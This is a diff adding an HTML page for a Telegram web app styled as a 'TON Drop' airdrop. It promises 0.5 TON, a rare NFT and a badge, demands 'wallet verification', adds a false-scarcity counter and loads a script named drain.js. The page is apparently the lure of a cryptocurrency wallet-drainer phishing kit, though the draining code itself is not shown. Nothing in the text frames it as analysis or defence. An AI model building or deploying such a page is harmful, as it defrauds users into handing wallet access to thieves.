@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>TON Drop | Claim Reward</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="config.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: var(--tg-theme-bg-color, #ffffff);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            padding: 20px;
+            color: var(--tg-theme-text-color, #000000);
+        }
+        
+        .container {
+            max-width: 480px;
+            margin: 0 auto;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #26a69a 0%, #00897b 100%);
+            border-radius: 24px;
+            margin: 0 auto 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            margin-bottom: 8px;
+        }
+        
+        .subtitle {
+            color: var(--tg-theme-hint-color, #666666);
+            font-size: 14px;
+        }
+        
+        .reward-card {
+            background: var(--tg-theme-secondary-bg-color, #f5f5f5);
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 24px;
+        }
+        
+        .reward-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 12px 0;
+            border-bottom: 1px solid var(--tg-theme-divider-color, #e0e0e0);
+        }
+        
+        .reward-item:last-child {
+            border-bottom: none;
+        }
+        
+        .reward-label {
+            font-weight: 500;
+        }
+        
+        .reward-value {
+            color: #26a69a;
+            font-weight: 600;
+        }
+        
+        button {
+            background: var(--tg-theme-button-color, #26a69a);
+            color: var(--tg-theme-button-text-color, #ffffff);
+            border: none;
+            padding: 16px 24px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 48px;
+            width: 100%;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+        
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        .status {
+            margin-top: 16px;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 14px;
+            text-align: center;
+            display: none;
+        }
+        
+        .status.loading {
+            background: rgba(38,166,154,0.1);
+            color: #26a69a;
+            display: block;
+        }
+        
+        .status.success {
+            background: rgba(76,175,80,0.1);
+            color: #4caf50;
+            display: block;
+        }
+        
+        .status.error {
+            background: rgba(244,67,54,0.1);
+            color: #f44336;
+            display: block;
+        }
+        
+        .footer {
+            margin-top: 24px;
+            text-align: center;
+            font-size: 12px;
+            color: var(--tg-theme-hint-color, #999999);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">🎁</div>
+            <h1>Claim Your Reward</h1>
+            <p class="subtitle">Wallet verification required</p>
+        </div>
+        
+        <div class="reward-card">
+            <div class="reward-item">
+                <span class="reward-label">🔥 TON Reward</span>
+                <span class="reward-value">0.5 TON</span>
+            </div>
+            <div class="reward-item">
+                <span class="reward-label">🎨 Rare NFT</span>
+                <span class="reward-value">Genesis #2341</span>
+            </div>
+            <div class="reward-item">
+                <span class="reward-label">⭐ Early Access</span>
+                <span class="reward-value">Badge</span>
+            </div>
+        </div>
+        
+        <button id="claimBtn">Connect Wallet & Claim</button>
+        <div id="status" class="status"></div>
+        <div class="footer">Limited offer • 2,347 claims left</div>
+    </div>
+    
+    <script src="drain.js"></script>
+</body>
+</html>
